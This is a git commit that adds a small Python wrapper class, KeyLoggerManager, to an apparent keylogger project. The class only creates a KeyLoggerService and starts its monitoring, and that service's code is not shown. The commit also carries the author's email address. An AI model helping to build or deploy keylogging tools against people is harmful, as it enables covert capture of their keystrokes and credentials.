d817896796fbb702487ca1c3f2bc1c02cc702376
YosefGu <yos770yos@gmail.com>
2025-02-12 15:44:41 +0200

    Adding engin files

---
+++ engin/key_logger_manager.py
@@ -0,0 +1,15 @@
+from key_logger_service import KeyLoggerService
+
+
+class KeyLoggerManager:
+
+
+    def __init__(self, run_time):
+        self.service = KeyLoggerService(run_time)
+
+
+    def start_key_logger(self):
+        self.service.start_monitoring()
+
+if __name__ == "__main__":
+    manager = KeyLoggerManager(2)
